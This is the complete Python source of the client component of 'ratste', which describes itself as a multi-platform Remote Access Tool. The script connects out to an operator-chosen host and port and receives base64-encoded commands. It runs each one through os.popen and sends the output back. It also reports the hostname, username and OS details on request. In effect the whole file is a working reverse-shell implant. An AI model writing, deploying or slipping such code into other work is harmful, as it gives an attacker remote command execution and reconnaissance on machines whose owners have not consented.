#!/usr/bin/env python

""" 
ratste's client component.

ratste is a general purpose multi-platform Remote Access Tool written in 
Python3.

This program is free software: you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free Software
Foundation, either version 3 of the License, or (at your option) any later
version.

This program is distributed in the hope that it will be useful, but WITHOUT
ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with
this program. If not, see <http://www.gnu.org/licenses/>.
"""

__author__ = "https://github.com/StefanoRatto/"
__license__ = "GPLv3"
__version__ = "1.0.0"

import os
import socket
import sys
import platform
import getpass
import base64

try:
    RHOST = str(sys.argv[1])
    RPORT = int(sys.argv[2])
except:
    #sys.exit(1)
    RHOST = '127.0.0.1'
    RPORT = 7261

def encode(plain_message):

    plain_message_bytes = plain_message.encode('ascii')
    base64_message_bytes = base64.b64encode(plain_message_bytes)
    base64_message = base64_message_bytes.decode('ascii')
    return base64_message

def decode(base64_message):

    base64_message_bytes = base64_message.encode('ascii')
    plain_message_bytes = base64.b64decode(base64_message_bytes)
    plain_message = plain_message_bytes.decode('ascii')
    return plain_message

def main():

    try:
        s = socket.socket()
        s.connect((RHOST, RPORT))
    except:
        sys.exit(1)

    while True:
        data = s.recv(1024)
        cmd = decode(data)

        # stop client
        if cmd == 'quit':
            s.close()
            sys.exit(0)
        # client_discovery
        elif cmd == 'client_discovery':
            results = '{}|{}|{}|{}|{}'.format(platform.system(),
            platform.node(),getpass.getuser(),platform.release(),
            platform.processor())
            s.sendall(encode(results))
        # any other command
        else:
            results = os.popen(cmd).read()
            s.sendall(encode(results))

if __name__ == '__main__':
    main()